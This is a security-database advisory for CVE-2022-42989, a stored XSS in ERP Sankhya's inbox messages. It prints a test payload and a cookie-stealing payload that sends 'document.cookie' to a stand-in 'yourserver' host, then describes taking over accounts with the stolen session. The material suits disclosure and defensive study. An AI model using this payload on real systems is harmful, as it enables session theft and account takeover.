---
title: ERP Sankhya 4.13.x Cross Site Scripting
url: https://cxsecurity.com/issue/WLB-2022100067
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2022-10-27
fetch_date: 2025-10-03T20:57:34.306683
---

# ERP Sankhya 4.13.x Cross Site Scripting

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **ERP Sankhya 4.13.x Cross Site Scripting** **2022.10.26**  Credit:  **[Lucas Alves Da Cunha](https://cxsecurity.com/author/Lucas%2BAlves%2BDa%2BCunha/1/)**  Risk: **Low**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2022-42989](https://cxsecurity.com/cveshow/CVE-2022-42989/ "Click to see CVE-2022-42989")**  CWE: **[CWE-79](https://cxsecurity.com/cwe/CWE-79 "Click to see CWE-79")** | |

# Exploit Title: ERP Sankhya - XSS to Account Takeover
# Google Dork: N/A
# Date: 19/10/2022
# Exploit Author: Lucas Alves Da Cunha - (0xLucas)
# Vendor Homepage: https://www.sankhya.com.br
# Version: Sankhya Om <= 4.13.x
# Tested on: Sankhya Om 4.11
# CVE: CVE-2022-42989
# Descrição:
Um usuário comum no ERP Sankhya pode enviar uma mensagem para qualquer outro usuário do sistema inclusive administradores, através da função "Caixa de Entrada". No corpo da mensagem, podemos injetar códigos html/javascript levando para um cross site scripting.
Payload para verificar existência da vulnerabilidade:
<img src=1 onerror=alert(1)>
Payload utilizado para capturar os dados da sessão do usuário:
<img src=1 onerror=document.location="http://yourserver/?cookie="+document.cookie>
# Passos para reprodução:
1 - Encontrando a funcionalidade: https://i.imgur.com/B9SWknH.png
2 - Enviando payload para verificar existência da vulnerabilidade: https://i.imgur.com/ZKSkLmx.png
2.1 - Vulnerabilidade comprovada: https://i.imgur.com/1KiAa1m.png
3 - Explorando a vulnerabilidade: https://i.imgur.com/n8Jevum.png
3.1 - Sessão capturada: https://i.imgur.com/aDatjyN.png
Podemos utilizar os dados da sessão capturada e manipular a sessão utilizando a ferramenta: Cookie-Editor do Google Chrome, e assim entraremos na sessão do usuário desejado. Conforme a imagem a seguir: https://i.imgur.com/L10Yf9f.png
# Impacto:
Explorando essa vulnerabilidade, podemos comprometer qualquer conta de usuário do sistema, desde uma simples conta até mesmo uma conta de administrador do sistema, causando assim um grande impacto de negócio.

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2022100067)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top